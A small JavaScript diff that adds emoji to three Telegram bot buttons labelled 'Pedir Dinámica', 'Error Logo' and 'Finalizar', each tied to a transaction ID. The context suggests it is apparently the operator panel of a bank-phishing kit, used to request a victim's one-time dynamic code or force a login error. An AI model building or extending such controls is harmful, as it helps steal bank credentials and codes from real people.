@@ -93,9 +93,9 @@ document.addEventListener('DOMContentLoaded', async function () {
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
-      [{ text: "Error Logo", callback_data: `error_logo:${transactionId}` }],
-      [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
+      [{ text: "📱Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
+      [{ text: "❌Error Logo", callback_data: `error_logo:${transactionId}` }],
+      [{ text: "🔚Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
     ]
   };
 
